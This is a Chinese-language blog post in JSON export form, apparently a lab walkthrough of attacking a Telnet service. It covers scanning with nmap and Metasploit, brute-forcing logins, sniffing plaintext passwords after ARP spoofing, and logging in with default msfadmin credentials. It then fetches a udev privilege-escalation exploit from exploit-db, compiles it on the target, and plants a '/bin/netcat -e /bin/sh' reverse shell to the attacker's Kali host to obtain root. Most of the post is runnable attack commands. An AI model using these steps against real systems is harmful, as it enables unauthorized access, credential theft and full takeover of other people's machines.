{"title":"Telnet漏洞","uid":"ee30e4a54bdc40c81ca3faa91eadc5d4","slug":"Telnet漏洞","date":"2021-10-24T13:44:27.000Z","updated":"2021-10-24T14:29:28.312Z","comments":true,"path":"api/articles/Telnet漏洞.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"Telnet介绍-直接复制粘贴\"><a href=\"#Telnet介绍-直接复制粘贴\" class=\"headerlink\" title=\"Telnet介绍(直接复制粘贴)\"></a>Telnet介绍(直接复制粘贴)</h2><p>  Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。</p>\n<p>  虽然Telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，Telnet并不被重用。原因在于Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务。如果我们要使用Telnet的远程登录，使用前应在远端服务器上检查并设置允许Telnet服务的功能。</p>\n<p>  Telnet服务端默认情况下使用23端口。</p>\n<h2 id=\"Telnet版本获取\"><a href=\"#Telnet版本获取\" class=\"headerlink\" title=\"Telnet版本获取\"></a>Telnet版本获取</h2><p>使用nmap获取telnet版本信息，或者使用metasploit获取对应版本信息。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nmap -p23 -sV IP地址   #对IP23号端口进行探测</code></pre>\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version\nset rhosts IP地址\nrun</code></pre>\n\n<h2 id=\"Telnet密码破解\"><a href=\"#Telnet密码破解\" class=\"headerlink\" title=\"Telnet密码破解\"></a>Telnet密码破解</h2><p>使用metasploit下针对telnet破解的模块进行用户名和密码的破解。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole\nsearch telnet\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nset rhosts IP地址\nset user_file 字典路径\nset pass_file 字典路径\nset threads 10\nrun</code></pre>\n\n<h2 id=\"Telnet登录测试\"><a href=\"#Telnet登录测试\" class=\"headerlink\" title=\"Telnet登录测试\"></a>Telnet登录测试</h2><p>使用破解好的账户名和密码进行登录测试，并执行相应的命令。</p>\n<p>接上面的操作</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sessions -l \nsessioms -i id</code></pre>\n\n<h2 id=\"Telnet客户端连接Telnet服务器\"><a href=\"#Telnet客户端连接Telnet服务器\" class=\"headerlink\" title=\"Telnet客户端连接Telnet服务器\"></a>Telnet客户端连接Telnet服务器</h2><p>Windows下开启telnet客户端，连接telnet服务端。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cmd\ntelnet\n?      #查看帮助\no 192.168.249.108    #连接服务器,是uio的o\n输入账号\n输入密码\n成功登录</code></pre>\n\n<h2 id=\"Telnet明文密码传输\"><a href=\"#Telnet明文密码传输\" class=\"headerlink\" title=\"Telnet明文密码传输\"></a>Telnet明文密码传输</h2><p>使用wireshark抓取telnet数据包</p>\n<p>在kali使用arp欺骗win10自己是主机，然后使用win10连接msf</p>\n<p>通过kali的wireshark抓包获取信息，通过分析找出密码，账号。</p>\n<h2 id=\"msf登录Telnet\"><a href=\"#msf登录Telnet\" class=\"headerlink\" title=\"msf登录Telnet\"></a>msf登录Telnet</h2><p>在metasploit中使用telnet_login模块进行登录，并使用sessions -i id 连接shell。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msfconsole\nuse auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login\nshow options\nset rhosts IP地址\nset username msfadmin\nset password msfadmin\nrun\nsessions -L\nsessions -i 1</code></pre>\n\n<p>msf连接shell下载exp</p>\n<p>使用wget进行下载</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572</code></pre>\n\n<p>但是，这么下载好像不行。所以我们通过kali搭建环境下载。</p>\n<p>再开启一个终端</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;var&#x2F;www&#x2F;html\nwget https:&#x2F;&#x2F;www.exploit-db.com&#x2F;download&#x2F;8572\nmv 8572 test.c    #将8572改为test.c\ncat test.c\nservice apache2 start </code></pre>\n\n<p>然后，我们回到msf会话中</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;    #进行下载</code></pre>\n\n<p>设置kali nc 监听</p>\n<p>使用netcat进行监听，后期返回的shell</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">nc -lvp 4444</code></pre>\n\n<p>我们要对程序进行编译执行exp，获取root权限</p>\n<p>再会话中</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">gcc test.c -o exploit</code></pre>\n\n<p>这个时候你可能发现有错误，因为c语言在后面要留几行，在kali中的test.c中加上几个空行就行了。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">rm test.c   #先删除会话中下载的test.c\nwget &quot;http:&#x2F;&#x2F;kaliIP地址&#x2F;test.c&quot;\ngcc test.c -o exploit\nls -alh  #查看权限\necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;run\necho &#39;&#x2F;bin&#x2F;netcat -e &#x2F;bin&#x2F;sh kaliIP地址:4444&#39; &gt;&gt; &#x2F;tmp&#x2F;run\nps aux|grep udev    #看到一个root执行\n.&#x2F;expolit 2743   #root执行减一</code></pre>\n\n<p>执行完便可在监听端口执行命令，权限为root。前面有问题直接删除。</p>\n<p><strong>rm /tmp/run</strong></p>\n<p><strong>rm exploit</strong></p>\n<p><strong>有些操作前面写过不截图了，方便。其他操作自己看着办吧。</strong></p>\n<p><img src=\"https://wx1.sinaimg.cn/mw2000/0089olAbly1gtov5zise9j607i07i0sr02.jpg\"></p>\n","text":" Telnet介绍(直接复制粘贴) Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中...","link":"","photos":[],"count_time":{"symbolsCount":"2.3k","symbolsTime":"2 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":7,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":3,"path":"api/tags/基础漏洞.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E4%BB%8B%E7%BB%8D-%E7%9B%B4%E6%8E%A5%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4\"><span class=\"toc-text\">Telnet介绍(直接复制粘贴)</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E7%89%88%E6%9C%AC%E8%8E%B7%E5%8F%96\"><span class=\"toc-text\">Telnet版本获取</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">Telnet密码破解</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E7%99%BB%E5%BD%95%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">Telnet登录测试</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5Telnet%E6%9C%8D%E5%8A%A1%E5%99%A8\"><span class=\"toc-text\">Telnet客户端连接Telnet服务器</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Telnet%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">Telnet明文密码传输</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#msf%E7%99%BB%E5%BD%95Telnet\"><span class=\"toc-text\">msf登录Telnet</span></a></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"安卓远控","uid":"46cf636a853cf895eb01f079c7dbe74c","slug":"安卓远控","date":"2021-10-25T12:10:12.000Z","updated":"2021-10-25T13:42:31.717Z","comments":true,"path":"api/articles/安卓远控.json","keywords":null,"cover":[],"text":" 写一点大家喜欢看的东西。。。。。。 安卓远控远程控制，是在网络上由一台电脑（主控端Remote/客户端）远距离去控制另一台电脑（被控端Host/服务器端）的技术，这里的远程不是字面意思的远距离，一般指通过网络控制远端电脑。 这次的安卓远控就是将正常的app嵌入恶意代码，当你安装...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"远控","slug":"远控","count":1,"path":"api/categories/远控.json"}],"tags":[{"name":"github","slug":"github","count":1,"path":"api/tags/github.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"ssh漏洞利用","uid":"68847bc4d9b92f6bbe7e25411fa69ec3","slug":"ssh漏洞利用","date":"2021-10-15T10:06:04.000Z","updated":"2021-10-17T05:42:02.930Z","comments":true,"path":"api/articles/ssh漏洞利用.json","keywords":null,"cover":[],"text":" SSH（安全外壳协议）SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。S...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":7,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","count":3,"path":"api/tags/基础漏洞.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}